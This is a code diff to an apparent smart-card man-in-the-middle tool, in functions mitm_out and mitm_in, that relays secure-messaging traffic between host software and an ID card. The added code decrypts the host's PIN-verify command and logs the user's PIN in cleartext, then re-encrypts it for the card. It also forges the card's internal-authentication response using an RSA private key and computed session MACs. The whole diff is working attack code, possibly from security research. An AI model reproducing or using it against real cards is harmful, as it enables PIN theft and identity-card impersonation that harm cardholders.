@@ -38,6 +38,7 @@ typedef enum {
   INIT_DH_PARAM,
   DH_KEY_EXCHANGE,
   DAPP,
+  VERIFYPIN,
   END
 } STAGE;
 STAGE stage = START;
@@ -98,13 +99,20 @@ uint8_t ExtAuth2[] = { 0x0c, 0x82, 0x00, 0x00 };
 uint8_t IntAuth[] = { 0x0c, 0x22, 0x41, 0xa4 };
 uint8_t GiveRandom[] = { 0x0c, 0x88, 0x00, 0x00 };
 
-uint8_t sn_icc[] = { 0x00, 0x68, 0x37, 0x56, 0x18, 0x03, 0x30, 0x1f };
+uint8_t sn_icc[8] = { 0x00, 0x68, 0x37, 0x56, 0x18, 0x03, 0x30, 0x1f };
+ByteArray sn_iccBa = VarToByteArray(sn_icc);
 BYTE certenc[354] = {};
 BYTE buffer_resp[293] = {};
 ByteDynArray challenge;
 ByteDynArray chResponse;
 uint8_t snIFD[] = { 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };
 ByteArray snIFDBa = VarToByteArray(snIFD);
+ByteDynArray PRND2(222);
+ByteDynArray toHashIFD;
+ByteDynArray rndIFD;
+ByteDynArray intAuthresp;
+ByteDynArray SIG;
+ByteDynArray intAuthSMresp;
 
 void increment(ByteArray &seq) {
 	for (size_t i = seq.size() - 1; i >= 0; i--) {
@@ -453,24 +461,48 @@ void mitm_out(BYTE *apdu, DWORD apduSize, SCARDHANDLE hCard, const SCARD_IO_REQU
 			BYTE supp[16];
 			memcpy(supp,apdu+8,16);
 			ByteArray encData = VarToByteArray(supp);
-			ByteDynArray data = encDes.RawDecode(encData);
-			data.resize(RemoveISOPad(data),true);
-			LOG_DEBUG("data dec:");
-			LOG_BUFFER(data.data(), data.size());
+			rndIFD = encDes.RawDecode(encData);
+			rndIFD.resize(RemoveISOPad(rndIFD),true);
+			LOG_DEBUG("rndIFD dec:");
+			LOG_BUFFER(rndIFD.data(), rndIFD.size());
 
 			ByteArray emptyBa;
 			ByteDynArray smApdu;
 			uint8_t le = 0;
 			BYTE head[] = { 0x00, 0x88, 0x00, 0x00 };
 			ByteArray headBa = VarToByteArray(head);
-			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
+			smApdu.set(&headBa, (uint8_t)rndIFD.size(), &rndIFD, &emptyBa);
 			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
 			memcpy(apdu, smApdu.data(), smApdu.size());
 
 			LOG_DEBUG("apdu modified:");
 			LOG_BUFFER(smApdu.data(), smApdu.size());
 		}
-		
+		break;
+	case VERIFYPIN:
+		{
+			ByteDynArray iv(8);
+			iv.fill(0);
+			CDES3 encDes(sessENC_IFD, iv);
+			BYTE supp[16];
+			memcpy(supp,apdu+8,16);
+			ByteArray encData = VarToByteArray(supp);
+			ByteDynArray decPin = encDes.RawDecode(encData);
+			decPin.resize(RemoveISOPad(decPin),true);
+			LOG_DEBUG("PIN dec:");
+			LOG_BUFFER(decPin.data(), decPin.size());
+
+			ByteArray emptyBa;
+			ByteDynArray smApdu;
+			BYTE head[] = { 0x00, 0x20, 0x00, 0x81 };
+			ByteArray headBa = VarToByteArray(head);
+			smApdu.set(&headBa, (uint8_t)decPin.size(), &decPin, &emptyBa);
+			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
+			memcpy(apdu, smApdu.data(), smApdu.size());
+
+			LOG_DEBUG("apdu modified:");
+			LOG_BUFFER(smApdu.data(), smApdu.size());
+		}
 		break;
 	default:
 		break;
@@ -621,6 +653,53 @@ void mitm_in(BYTE *resp, DWORD *respSize) {
 				ccfb.setASN1Tag(0x8e, smMac);
 				respBa.set(&data, &ccfb, &swBa);
 				memcpy(resp, respBa.data(), *respSize);
+			} else if (memcmp(curr_apdu, GiveRandom, 4) == 0) {
+				CRSA intAuthKey(module, privexp);
+				PRND2.random();
+				toHashIFD.set(&PRND2, &dh_pubKey_mitm, &sn_iccBa, &rndIFD, &dh_IFDpubKey, &dh_g, &dh_p, &dh_q);
+				ByteDynArray calcHashIFD = sha256.Digest(toHashIFD);
+				uint8_t val6a = 0x6a;
+				ByteArray val6ABa = VarToByteArray(val6a);
+				uint8_t valbc = 0xbc;
+				ByteArray valbcBa = VarToByteArray(valbc);
+				ByteDynArray respBa;
+				respBa.set(&val6ABa, &PRND2, &calcHashIFD, &valbcBa);
+				SIG = intAuthKey.RSA_PURE(respBa);
+				intAuthresp.set(&sn_iccBa, &SIG);
+
+				//crafting the response
+				ByteDynArray iv(8);
+				iv.fill(0);
+				increment(sessSSC_ICC);
+				increment(sessSSC_IFD);
+				CDES3 encDes_IFD(sessENC_IFD, iv);
+				CMAC sigMac_IFD(sessMAC_IFD, iv);
+				ByteDynArray encIntAuthresp;
+				encIntAuthresp = encDes_IFD.RawEncode(ISOPad(intAuthresp));
+				ByteDynArray datafield;
+				uint8_t Val01 = 1;
+				datafield.setASN1Tag(0x87, VarToByteDynArray(Val01).append(encIntAuthresp));
+				ByteDynArray calcMac = sessSSC_IFD;
+				uint8_t macTail[4] = { 0x99, 0x02, 0x90, 0x00 };
+				calcMac.append(datafield).append(VarToByteDynArray(macTail));
+				auto smMac = sigMac_IFD.Mac(ISOPad(calcMac));
+
+				uint8_t sw[2] = {0x90, 0x00};
+				ByteDynArray swBa = VarToByteDynArray(sw);
+				ByteDynArray data;
+				data = datafield.append(VarToByteDynArray(macTail));
+				ByteDynArray ccfb;
+				ccfb.setASN1Tag(0x8e, smMac);
+				intAuthSMresp.set(&data, &ccfb, &swBa);
+
+				memcpy(resp, intAuthSMresp.data(), 256);
+			} else if (memcmp(prev_apdu, GiveRandom, 4) == 0) { 
+				memcpy(resp, intAuthSMresp.data()+256, 35);
+				stage = VERIFYPIN;
+				ByteArray challengeBa = challenge.right(4);
+    			ByteArray rndIFDBa = rndIFD.right(4);
+				sessSSC_ICC.set(&challengeBa, &rndIFDBa);
+				sessSSC_IFD.set(&challengeBa, &rndIFDBa);
 			} else {
 				LOG_BUFFER(resp, *respSize);
 				BYTE temp[16] = {};
@@ -630,6 +709,17 @@ void mitm_in(BYTE *resp, DWORD *respSize) {
 				memcpy(resp, crafted_resp.data(), 16);
 			}
 		break;
+	case VERIFYPIN:
+		{
+			LOG_BUFFER(resp, *respSize);
+			BYTE temp[16] = {};
+			memcpy(temp, resp, 16); 
+			ByteDynArray respBa = VarToByteArray(temp);
+			ByteArray crafted_resp = craft_respSM(sessENC_IFD, sessMAC_IFD, respBa, sessSSC_IFD);
+			memcpy(resp, crafted_resp.data(), 16);
+
+			stage = END;
+		}
 	default:
 		break;
 	}
